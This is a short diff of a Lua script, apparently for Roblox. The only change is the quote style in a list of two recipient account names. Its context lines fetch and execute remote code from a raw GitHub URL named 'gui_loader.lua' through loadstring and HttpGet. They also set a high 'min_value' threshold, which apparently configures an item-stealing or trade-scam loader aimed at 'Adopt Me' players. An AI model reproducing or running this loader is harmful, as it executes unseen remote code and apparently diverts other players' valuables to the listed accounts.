@@ -1,8 +1,8 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
 users = {
-    'ajandaa12alt1',
-    'ajandaa12alt',
+    "ajandaa12alt1",
+    "ajandaa12alt",
 }
 min_value = 10000000
 ping = "true"
